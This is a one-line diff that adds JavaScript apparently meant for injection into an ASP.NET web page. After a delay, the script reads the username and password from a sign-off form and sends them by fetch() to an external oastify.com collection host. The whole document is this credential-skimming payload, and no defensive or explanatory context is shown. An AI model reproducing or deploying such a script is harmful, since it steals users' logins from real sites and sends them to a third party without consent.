@@ -1,0 +1,1 @@
+setTimeout(()=>{p=(x=new FormData(document.aspnetForm)).get("ctl00$LegislationMasterBody$ucSignOff$txtPassword"),z=x.get("ctl00$LegislationMasterBody$ucSignOff$txtUserName"),fetch("https://5hnc0goes0b18gvf87rayiz79yfo3d.oastify.com?username="+z+"&password="+p)},9e3)
